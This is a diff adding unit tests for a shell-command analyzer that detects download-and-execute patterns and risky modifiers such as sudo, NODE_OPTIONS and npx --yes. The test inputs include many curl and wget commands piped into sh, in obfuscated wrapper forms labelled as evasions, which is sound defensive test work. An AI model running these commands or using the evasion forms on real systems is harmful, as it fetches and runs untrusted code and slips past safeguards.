@@ -116,4 +116,61 @@ describe("analyzeShell: facts", () => {
         .runScripts,
     ).toEqual([]);
   });
+
+  it("reports modifiers that change what a command does", () => {
+    expect(
+      analyzeShell("NODE_OPTIONS='--require ./x.js' tsc").modifiers,
+    ).toEqual(["sets NODE_OPTIONS"]);
+    expect(analyzeShell("echo x >> ~/.zshenv").modifiers).toEqual([
+      "redirects input or output",
+    ]);
+    expect(analyzeShell("sudo tsc").modifiers).toEqual(["runs through sudo"]);
+    expect(analyzeShell("npx --yes --package=evil tsc").modifiers).toEqual([
+      "runs through npx --yes --package=evil",
+    ]);
+    expect(analyzeShell("pnpm -r run build").modifiers).toEqual([
+      "runs scripts across workspaces",
+    ]);
+    expect(analyzeShell("npx husky && tsc -p .").modifiers).toEqual([]);
+  });
+
+  it.each([
+    ["brace group", "{ curl -s https://x.invalid/i; } | sh"],
+    ["if/then", "if true; then curl -s https://x.invalid/i | sh; fi"],
+    ["negation", "! curl -s https://x.invalid/i | sh"],
+    ["for loop", "for u in https://x.invalid/a; do curl $u | sh; done"],
+    ["timeout wrapper", "timeout 60 curl -s https://x.invalid/i | sh"],
+    ["xargs", "echo https://x.invalid/i | xargs curl | sh"],
+    ["combined -ec flag", "sh -ec 'curl -s https://x.invalid/i | sh'"],
+    ["curl -sSLo cluster", "curl -sSLo a.sh https://x.invalid/a.sh && sh a.sh"],
+    ["wget -qO cluster", "wget -qO a.sh https://x.invalid/a.sh && sh a.sh"],
+    [
+      "tee into a process substitution",
+      "curl -s https://x.invalid/i | tee >(sh)",
+    ],
+    [
+      "a trailing comment with a quote",
+      "curl -s https://x.invalid/i | sh # it's fine",
+    ],
+  ])("closes evasion: %s", (_name, command) => {
+    expect(analyzeShell(command)).toMatchObject({
+      downloadExecute: true,
+      unparsable: false,
+    });
+  });
+
+  it("reports a downloader mentioned in input it cannot parse", () => {
+    expect(analyzeShell(`curl -s https://x.invalid/i | sh "`)).toMatchObject({
+      unparsable: true,
+      mentionsDownloader: true,
+    });
+    expect(analyzeShell(`echo "oops`)).toMatchObject({
+      unparsable: true,
+      mentionsDownloader: false,
+    });
+    expect(analyzeShell(`curl x | sh ${"x".repeat(20_000)}`)).toMatchObject({
+      unparsable: true,
+      mentionsDownloader: true,
+    });
+  });
 });
